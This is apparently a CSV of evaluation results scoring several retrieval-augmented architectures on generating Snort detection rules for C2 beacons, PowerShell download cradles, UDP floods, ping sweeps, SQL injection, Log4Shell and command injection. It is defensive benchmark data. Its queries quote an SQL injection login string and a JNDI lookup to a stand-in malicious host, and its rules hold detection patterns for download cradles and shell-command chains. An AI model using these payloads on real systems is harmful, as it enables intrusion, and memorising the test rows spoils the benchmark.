query_id,architecture,query,precision_at_3,recall_at_3,recall_at_5,mrr,ndcg_at_5,family_accuracy,type_accuracy,protocol_accuracy,port_accuracy,snort_syntax_valid,rule_token_jaccard,hallucination_flag,expected_doc_id,retrieved_ids,generated_family,expected_family,generated_type,expected_type,generated_rule
Q_013,rag_hybrid,How can we detect need IDS detection logic for HTTP C2 Beacon: Generate a rule for possible malware C2 HTTP beacon traffic. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0011,SNORT_0011;SNORT_0147;SNORT_0130;SNORT_0096;SNORT_0062,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000011; rev:1;)"
Q_013,multi_hop,How can we detect need IDS detection logic for HTTP C2 Beacon: Generate a rule for possible malware C2 HTTP beacon traffic. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0011,SNORT_0011;SNORT_0147;SNORT_0130;SNORT_0096;SNORT_0062,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000011; rev:1;)"
Q_013,graph_rag,How can we detect need IDS detection logic for HTTP C2 Beacon: Generate a rule for possible malware C2 HTTP beacon traffic. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0011,SNORT_0011;SNORT_0147;SNORT_0130;SNORT_0028;SNORT_0113,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000011; rev:1;)"
Q_013,agentic_rag,How can we detect need IDS detection logic for HTTP C2 Beacon: Generate a rule for possible malware C2 HTTP beacon traffic. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0011,SNORT_0011;SNORT_0147;SNORT_0130;SNORT_0096;SNORT_0062,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000011; rev:1;)"
Q_014,baseline,Create a rule for suspicious PowerShell download cradle content.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,1.0,SNORT_0131,,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000012; rev:1;)"
Q_014,rag_classic,Create a rule for suspicious PowerShell download cradle content.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0131,SNORT_0097;SNORT_0131;SNORT_0063;SNORT_0012;SNORT_0114,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000097; rev:1;)"
Q_014,rag_rerank,Create a rule for suspicious PowerShell download cradle content.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0131,SNORT_0097;SNORT_0131;SNORT_0063;SNORT_0012;SNORT_0114,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000097; rev:1;)"
Q_014,rag_hybrid,Create a rule for suspicious PowerShell download cradle content.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0131,SNORT_0097;SNORT_0131;SNORT_0063;SNORT_0012;SNORT_0114,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000097; rev:1;)"
Q_014,multi_hop,Create a rule for suspicious PowerShell download cradle content.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0131,SNORT_0097;SNORT_0131;SNORT_0063;SNORT_0012;SNORT_0114,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000097; rev:1;)"
Q_014,graph_rag,Create a rule for suspicious PowerShell download cradle content.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0131,SNORT_0097;SNORT_0131;SNORT_0063;SNORT_0046;SNORT_0114,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000097; rev:1;)"
Q_014,agentic_rag,Create a rule for suspicious PowerShell download cradle content.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0131,SNORT_0097;SNORT_0131;SNORT_0063;SNORT_0012;SNORT_0114,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000097; rev:1;)"
Q_015,baseline,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 500.",0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.375,1.0,SNORT_0072,,Reconnaissance,DoS_DDoS,TCP SYN Port Scan,UDP Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)"
Q_015,rag_classic,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 500.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0072,SNORT_0072;SNORT_0021;SNORT_0157;SNORT_0004;SNORT_0089,DoS_DDoS,DoS_DDoS,UDP Flood,UDP Flood,"alert udp $EXTERNAL_NET any -> $HOME_NET 500 (msg:""Possible UDP flood on IKE""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000072; rev:1;)"
Q_015,rag_rerank,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 500.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0072,SNORT_0072;SNORT_0021;SNORT_0157;SNORT_0089;SNORT_0004,DoS_DDoS,DoS_DDoS,UDP Flood,UDP Flood,"alert udp $EXTERNAL_NET any -> $HOME_NET 500 (msg:""Possible UDP flood on IKE""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000072; rev:1;)"
Q_015,rag_hybrid,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 500.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0072,SNORT_0072;SNORT_0004;SNORT_0021;SNORT_0088;SNORT_0139,DoS_DDoS,DoS_DDoS,UDP Flood,UDP Flood,"alert udp $EXTERNAL_NET any -> $HOME_NET 500 (msg:""Possible UDP flood on IKE""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000072; rev:1;)"
Q_015,multi_hop,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 500.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0072,SNORT_0072;SNORT_0021;SNORT_0089;SNORT_0157;SNORT_0004,DoS_DDoS,DoS_DDoS,UDP Flood,UDP Flood,"alert udp $EXTERNAL_NET any -> $HOME_NET 500 (msg:""Possible UDP flood on IKE""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000072; rev:1;)"
Q_015,graph_rag,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 500.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0072,SNORT_0072;SNORT_0021;SNORT_0157;SNORT_0089;SNORT_0004,DoS_DDoS,DoS_DDoS,UDP Flood,UDP Flood,"alert udp $EXTERNAL_NET any -> $HOME_NET 500 (msg:""Possible UDP flood on IKE""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000072; rev:1;)"
Q_015,agentic_rag,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 500.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0072,SNORT_0072;SNORT_0004;SNORT_0021;SNORT_0088;SNORT_0139,DoS_DDoS,DoS_DDoS,UDP Flood,UDP Flood,"alert udp $EXTERNAL_NET any -> $HOME_NET 500 (msg:""Possible UDP flood on IKE""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000072; rev:1;)"
Q_016,baseline,Generate a Snort rule to rule for icmp ping sweep on the network. Observed log: Firewall log: ICMP echo requests to multiple hosts from 198.51.100.28,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,1.0,SNORT_0138,,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000104; rev:1;)"
Q_016,rag_classic,Generate a Snort rule to rule for icmp ping sweep on the network. Observed log: Firewall log: ICMP echo requests to multiple hosts from 198.51.100.28,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0138,SNORT_0087;SNORT_0138;SNORT_0019;SNORT_0070;SNORT_0053,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000087; rev:1;)"
Q_016,rag_rerank,Generate a Snort rule to rule for icmp ping sweep on the network. Observed log: Firewall log: ICMP echo requests to multiple hosts from 198.51.100.28,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0138,SNORT_0087;SNORT_0138;SNORT_0019;SNORT_0070;SNORT_0053,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000087; rev:1;)"
Q_016,rag_hybrid,Generate a Snort rule to rule for icmp ping sweep on the network. Observed log: Firewall log: ICMP echo requests to multiple hosts from 198.51.100.28,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0138,SNORT_0138;SNORT_0087;SNORT_0070;SNORT_0019;SNORT_0053,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000138; rev:1;)"
Q_016,multi_hop,Generate a Snort rule to rule for icmp ping sweep on the network. Observed log: Firewall log: ICMP echo requests to multiple hosts from 198.51.100.28,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0138,SNORT_0138;SNORT_0087;SNORT_0019;SNORT_0070;SNORT_0053,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000138; rev:1;)"
Q_016,graph_rag,Generate a Snort rule to rule for icmp ping sweep on the network. Observed log: Firewall log: ICMP echo requests to multiple hosts from 198.51.100.28,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0138,SNORT_0104;SNORT_0121;SNORT_0138;SNORT_0087;SNORT_0070,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000104; rev:1;)"
Q_016,agentic_rag,Generate a Snort rule to rule for icmp ping sweep on the network. Observed log: Firewall log: ICMP echo requests to multiple hosts from 198.51.100.28,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0138,SNORT_0138;SNORT_0087;SNORT_0070;SNORT_0019;SNORT_0053,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000138; rev:1;)"
Q_017,baseline,How can we detect generate a Snort rule for a web request containing SQL injection keywords. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.10,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,1.0,SNORT_0073,,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000005; rev:1;)"
Q_017,rag_classic,How can we detect generate a Snort rule for a web request containing SQL injection keywords. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.10,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0073,SNORT_0073;SNORT_0090;SNORT_0039;SNORT_0005;SNORT_0124,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000073; rev:1;)"
Q_017,rag_rerank,How can we detect generate a Snort rule for a web request containing SQL injection keywords. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.10,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0073,SNORT_0073;SNORT_0039;SNORT_0090;SNORT_0005;SNORT_0124,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000073; rev:1;)"
Q_017,rag_hybrid,How can we detect generate a Snort rule for a web request containing SQL injection keywords. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.10,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0073,SNORT_0073;SNORT_0090;SNORT_0039;SNORT_0005;SNORT_0141,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000073; rev:1;)"
Q_017,multi_hop,How can we detect generate a Snort rule for a web request containing SQL injection keywords. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.10,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0073,SNORT_0073;SNORT_0090;SNORT_0039;SNORT_0141;SNORT_0005,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000073; rev:1;)"
Q_017,graph_rag,How can we detect generate a Snort rule for a web request containing SQL injection keywords. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.10,0.0,0.0,1.0,0.25,0.43067655807339306,1.0,1.0,1.0,1.0,1.0,0.9130434782608695,0.0,SNORT_0073,SNORT_0039;SNORT_0056;SNORT_0005;SNORT_0073;SNORT_0124,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000039; rev:1;)"
Q_017,agentic_rag,How can we detect generate a Snort rule for a web request containing SQL injection keywords. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.10,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0073,SNORT_0073;SNORT_0090;SNORT_0039;SNORT_0005;SNORT_0141,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000073; rev:1;)"
Q_018,baseline,Write a Snort rule for generate a Snort rule for HTTP payloads with ${jndi: patterns. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,1.0,SNORT_0151,,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)"
Q_018,rag_classic,Write a Snort rule for generate a Snort rule for HTTP payloads with ${jndi: patterns. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.0,0.0,1.0,0.2,0.38685280723454163,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0151,SNORT_0032;SNORT_0100;SNORT_0066;SNORT_0083;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)"
Q_018,rag_rerank,Write a Snort rule for generate a Snort rule for HTTP payloads with ${jndi: patterns. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.0,0.0,1.0,0.2,0.38685280723454163,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0151,SNORT_0032;SNORT_0066;SNORT_0100;SNORT_0083;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)"
Q_018,rag_hybrid,Write a Snort rule for generate a Snort rule for HTTP payloads with ${jndi: patterns. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.0,0.0,1.0,0.2,0.38685280723454163,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0151,SNORT_0032;SNORT_0066;SNORT_0100;SNORT_0083;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)"
Q_018,multi_hop,Write a Snort rule for generate a Snort rule for HTTP payloads with ${jndi: patterns. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.0,0.0,1.0,0.2,0.38685280723454163,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0151,SNORT_0032;SNORT_0066;SNORT_0100;SNORT_0083;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)"
Q_018,graph_rag,Write a Snort rule for generate a Snort rule for HTTP payloads with ${jndi: patterns. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0151,SNORT_0032;SNORT_0066;SNORT_0101;SNORT_0049;SNORT_0033,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)"
Q_018,agentic_rag,Write a Snort rule for generate a Snort rule for HTTP payloads with ${jndi: patterns. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.0,0.0,1.0,0.2,0.38685280723454163,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0151,SNORT_0032;SNORT_0066;SNORT_0100;SNORT_0083;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)"
Q_019,baseline,Rule for command injection on the network.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,1.0,SNORT_0144,,Web_Attack,Web_Attack,Command Injection,Command Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000008; rev:1;)"
Q_019,rag_classic,Rule for command injection on the network.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9130434782608695,0.0,SNORT_0144,SNORT_0127;SNORT_0144;SNORT_0059;SNORT_0093;SNORT_0110,Web_Attack,Web_Attack,Command Injection,Command Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000127; rev:1;)"
Q_019,rag_rerank,Rule for command injection on the network.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9130434782608695,0.0,SNORT_0144,SNORT_0127;SNORT_0144;SNORT_0059;SNORT_0093;SNORT_0110,Web_Attack,Web_Attack,Command Injection,Command Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000127; rev:1;)"
Q_019,rag_hybrid,Rule for command injection on the network.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9130434782608695,0.0,SNORT_0144,SNORT_0127;SNORT_0144;SNORT_0059;SNORT_0093;SNORT_0110,Web_Attack,Web_Attack,Command Injection,Command Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000127; rev:1;)"
Q_019,multi_hop,Rule for command injection on the network.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0144,SNORT_0144;SNORT_0127;SNORT_0059;SNORT_0093;SNORT_0110,Web_Attack,Web_Attack,Command Injection,Command Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000144; rev:1;)"
Q_019,graph_rag,Rule for command injection on the network.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9130434782608695,0.0,SNORT_0144,SNORT_0127;SNORT_0144;SNORT_0059;SNORT_0110;SNORT_0008,Web_Attack,Web_Attack,Command Injection,Command Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000127; rev:1;)"
